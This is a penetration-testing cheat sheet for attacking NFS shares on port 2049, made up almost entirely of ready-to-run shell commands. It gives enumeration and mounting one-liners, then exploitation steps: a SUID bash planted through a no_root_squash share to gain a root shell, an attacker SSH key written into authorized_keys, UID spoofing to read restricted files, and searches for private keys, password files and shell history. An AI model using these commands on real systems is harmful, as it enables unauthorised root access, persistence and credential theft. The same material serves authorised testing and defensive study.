# Port 2049 - NFS

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [Show Exports](#show-exports)
- [Mounting Shares](#mounting-shares)
- [Exploitation](#exploitation)
  - [Root Squash Bypass](#root-squash-bypass)
  - [SUID Exploitation](#suid-exploitation)
  - [SSH Key Injection](#ssh-key-injection)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Show exports + mount info
showmount -e $rhost 2>/dev/null && showmount -a $rhost 2>/dev/null
```

### Nmap Scripts (One-liner)

```shell
# All NFS scripts in one command
nmap -p 111,2049 --script "nfs-*,rpcinfo" -sV $rhost
```

---

## Mounting Shares (One-liner)

```shell
# Mount NFS share (auto version detection)
mkdir -p /tmp/nfs && mount -t nfs -o nolock $rhost:/share /tmp/nfs && ls -la /tmp/nfs

# Mount with specific version if needed
mkdir -p /tmp/nfs && mount -t nfs -o nolock,vers=3 $rhost:/share /tmp/nfs

# Quick mount all exports
for share in $(showmount -e $rhost 2>/dev/null | tail -n+2 | awk '{print $1}'); do mkdir -p /tmp/nfs_$share && mount -t nfs -o nolock $rhost:$share /tmp/nfs_$share 2>/dev/null && echo "[+] Mounted $share"; done
```

---

## Exploitation

### Root Squash Bypass

> Check /etc/exports for no_root_squash

```shell
# no_root_squash = root on client maps to root on server
# root_squash = root on client maps to nobody (default)

# If no_root_squash is set, we can create files as root
echo "test" > /tmp/nfs/root_file
ls -la /tmp/nfs/root_file
# File owned by root
```

### SUID Exploitation

> Works when no_root_squash is enabled

```shell
# On attacker (as root)
# Copy bash to NFS share
cp /bin/bash /tmp/nfs/shell

# Set SUID bit
chmod +s /tmp/nfs/shell

# On target (as low-privilege user)
/share/shell -p
# Now you have root shell!
```

### SSH Key Injection

```shell
# If user's home directory is exported
# Create .ssh directory
mkdir /tmp/nfs/.ssh

# Add your public key
echo "ssh-rsa AAAA... attacker@kali" > /tmp/nfs/.ssh/authorized_keys

# Set permissions
chmod 700 /tmp/nfs/.ssh
chmod 600 /tmp/nfs/.ssh/authorized_keys

# Connect via SSH
ssh user@$rhost
```

---

## Post-Exploitation

### Credential Hunting

```shell
# Look for sensitive files
find /tmp/nfs -name "*.conf" 2>/dev/null
find /tmp/nfs -name "*.txt" 2>/dev/null
find /tmp/nfs -name "*password*" 2>/dev/null
find /tmp/nfs -name "*secret*" 2>/dev/null

# Check for SSH keys
cat /tmp/nfs/.ssh/id_rsa
cat /tmp/nfs/.ssh/authorized_keys

# Check bash history
cat /tmp/nfs/.bash_history
```

### UID Manipulation

> NFS uses UID/GID for access control

```shell
# Check target file ownership
ls -la /tmp/nfs/

# If file is owned by UID 1001, create local user with that UID
useradd -u 1001 fakeuser

# Switch to that user
su fakeuser

# Now you can access those files
cat /tmp/nfs/restricted_file
```

---

## Configuration Files

```shell
# NFS exports configuration
/etc/exports

# Common export options
# rw - Read/Write
# ro - Read Only
# sync - Synchronous writes
# async - Asynchronous writes
# no_root_squash - Don't map root to nobody
# root_squash - Map root to nobody (default)
# no_all_squash - Don't map all users to nobody
# all_squash - Map all users to nobody
```

---

## Metasploit Modules

```shell
# NFS mount scanner
use auxiliary/scanner/nfs/nfsmount
set RHOSTS $rhost
run
```
